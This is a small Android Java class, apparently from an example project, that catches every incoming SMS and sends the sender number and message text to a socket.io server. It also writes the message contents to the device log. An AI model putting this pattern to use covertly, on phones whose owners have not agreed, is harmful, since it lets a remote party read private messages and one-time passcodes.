package com.example.edeph.androidwebsocket;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.github.nkzawa.socketio.client.Socket;

public class IncomingSms extends BroadcastReceiver
{
    private Socket mSocket;
    private String TAG = "SMS_BROADCAST_RECEIVER";

    public IncomingSms(){}

    public IncomingSms(Socket sock)
    {
        Log.d(TAG, "CREATED BROADCAST");
        mSocket = sock;
    }

    public void onReceive(Context context, Intent intent)
    {
        // Retrieves a map of extended data from the intent.
        final Bundle bundle = intent.getExtras();
        try {
            if (bundle != null)
            {
                final Object[] pdusObj = (Object[]) bundle.get("pdus");

                for (int i = 0; i < pdusObj.length; i++) {

                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();

                    String senderNum = phoneNumber;
                    String message = currentMessage.getDisplayMessageBody();

                    //fill in with data to emit
                    mSocket.emit("smsForward",senderNum + "|" + message);

                    Log.i(TAG, "senderNum: " + senderNum + "; message: " + message);
                } // end for loop
            } // bundle is null

        } catch (Exception e) {
            Log.e(TAG, "Exception smsReceiver" +e);
        }
    }
}